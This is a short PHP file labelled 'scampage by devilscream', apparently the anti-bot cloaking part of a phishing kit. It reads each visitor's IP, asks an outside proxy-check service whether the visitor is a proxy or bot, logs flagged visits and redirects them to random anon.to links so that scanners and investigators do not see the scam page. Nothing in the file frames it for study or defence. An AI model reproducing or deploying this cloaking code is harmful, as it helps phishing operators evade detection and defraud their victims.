<?php
//scampage by devilscream

$random_id = sha1(rand(0,1000000));
$link = array("https://anon.to/TEYbaT",
"https://anon.to/WMvjpm",
"https://anon.to/yJovVQ",
"https://anon.to/GIq0NK",
"https://anon.to/8Mc8XE",
"https://anon.to/hnRYBQ",
"https://anon.to/gu34He",
"https://anon.to/HTmuIH",
"https://anon.to/V5nn87",
"https://anon.to/KrOSup");
$random = rand(0, 11);
$link = $link[$random];
date_default_timezone_set('Asia/Jakarta');
$v_ip = $_SERVER['REMOTE_ADDR'];
$v_date = date("l d F H:i:s");
$fp = fopen("../log/blocked.txt", "a");

function getUserIPs()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$ip = getUserIPs();
    if($ip == "127.0.0.1") {
    }else{
    	$url = "http://proxy.mind-media.com/block/proxycheck.php?ip=".$ip;
    	$ch = curl_init();  
    	curl_setopt($ch,CURLOPT_URL,$url);
    	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    	$resp = curl_exec($ch);
    	curl_close($ch);
    	$result = $resp;
    	if($result == "Y") {
    		fputs($fp, "PROXY BOT Telah di BLOKIR");
            fclose($fp);
    		header("location: $link");
            exit();
    	}
    }
?>